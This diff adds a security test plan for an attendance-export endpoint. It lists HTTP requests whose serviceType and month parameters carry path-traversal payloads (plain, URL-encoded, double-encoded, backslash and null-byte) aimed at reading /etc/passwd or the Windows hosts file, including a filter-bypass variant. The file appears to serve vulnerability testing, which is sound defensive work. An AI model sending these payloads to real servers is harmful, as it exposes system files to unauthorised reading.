@@ -1,0 +1,39 @@
+# Test Case 1: Basic Path Traversal via serviceType
+GET /getallattendance?serviceType=../../../../etc/passwd&date=1&month=january&year=2024
+Expected: Server responds with the contents of /etc/passwd or an error if vulnerable.
+
+# Test Case 2: URL-encoded Path Traversal in serviceType
+GET /getallattendance?serviceType=%2e%2e%2f%2e%2e%2fetc%2fpasswd&date=1&month=january&year=2024
+Expected: Attempts to access /etc/passwd via URL-encoded '../' sequences.
+
+# Test Case 3: Traversal using backslashes (Windows)
+GET /getallattendance?serviceType=..\..\..\..\Windows\System32\drivers\etc\hosts&date=1&month=january&year=2024
+Expected: Accesses Windows hosts file if server is Windows-based.
+
+# Test Case 4: Traversal via month parameter
+GET /getallattendance?serviceType=daily&date=1&month=../../etc&year=2024
+Expected: Path becomes 'attendance daily (1-../../etc-2024).xlsx', escaping directory.
+
+# Test Case 5: Invalid date/year to test type handling
+GET /getallattendance?serviceType=test&date=invalid&month=january&year=invalid
+Expected: Server may default date/year to 0 or NaN, check error handling.
+
+# Test Case 6: Combined parameters for traversal
+GET /getallattendance?serviceType=attendance/../../../&date=1&month=..&year=2024
+Expected: Uses both serviceType and month to manipulate the path.
+
+# Test Case 7: Deep traversal to escape multiple directories
+GET /getallattendance?serviceType=../../../../../../../../etc/passwd&date=1&month=january&year=2024
+Expected: Escapes enough directories to reach root and access /etc/passwd.
+
+# Test Case 8: Double encoding in serviceType
+GET /getallattendance?serviceType=%252e%252e%252fetc%252fpasswd&date=1&month=january&year=2024
+Expected: Bypass potential filters by double-encoding '../' (%252e%252e%252f decodes to %2e%2e%2f).
+
+# Test Case 9: Null byte injection (if supported)
+GET /getallattendance?serviceType=../../etc/passwd%00&date=1&month=january&year=2024
+Expected: Truncate filename after .xlsx (if null byte allowed).
+
+# Test Case 10: Valid parameters to check normal behavior
+GET /getallattendance?serviceType=validService&date=1&month=january&year=2024
+Expected: Correctly downloads 'attendance validService (1-january-2024).xlsx'.
